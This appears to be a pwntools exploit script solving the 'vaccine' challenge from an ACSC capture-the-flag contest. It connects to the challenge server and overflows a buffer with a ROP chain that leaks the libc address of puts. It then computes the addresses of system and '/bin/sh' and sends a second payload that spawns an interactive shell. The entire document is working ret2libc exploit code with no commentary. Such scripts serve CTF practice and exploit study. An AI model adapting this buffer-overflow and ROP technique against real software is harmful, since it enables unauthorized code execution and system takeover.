from pwn import *
s = remote('vaccine.chal.ctf.acsc.asia', 1337)
#s = process(executable = "./vaccine", argv = [])

chall = ELF("./vaccine")


pop_rdi = 0x0000000000401443
puts_got = chall.got["puts"]
puts_plt = chall.plt["puts"]
ret = 0x000000000040101a
main = 0x0000000000401236

payload = b"A" + b"\x00" * 111 + b"A" + b"\x00" * (0x100 - 113) + b"aaaaaaaa" + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
s.sendline(payload)
s.recvuntil(b"your flag is in another castle\n")

addr = int.from_bytes(s.recv(6), "little")
print("puts address:", hex(addr))
system_offset = 0x0000000000052290
binsh_offset = 0x1b45bd
puts_offset = 0x0000000000084420
system = addr - puts_offset + system_offset 
binsh = addr - puts_offset + binsh_offset

payload = b"A" + b"\x00" * 111 + b"A" + b"\x00" * (0x100 - 113) + b"aaaaaaaa" + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)

s.sendlineafter(b"Give me vaccine: ", payload)


s.interactive()